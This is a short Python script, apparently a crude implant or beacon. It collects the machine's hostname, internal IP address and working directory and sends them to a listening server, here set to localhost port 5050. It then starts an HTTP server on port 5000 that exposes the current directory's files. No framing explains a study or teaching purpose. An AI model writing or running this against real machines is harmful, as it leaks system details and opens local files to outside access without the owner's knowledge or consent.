import socket
import os
hostname= socket.gethostname() #hostname
ip= socket.gethostbyname(hostname) #internal ip
dir=os.getcwd()
#print(f"IP:{ip}")
my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_socket.connect(('127.0.0.1', 5050)) #ip server
#name = input("Enter your name: ")
my_socket.send(ip.encode()+dir.encode()+hostname.encode())
data = my_socket.recv(1024)
os.system("python -m http.server 5000")
#print(data.decode())
#my_socket.close()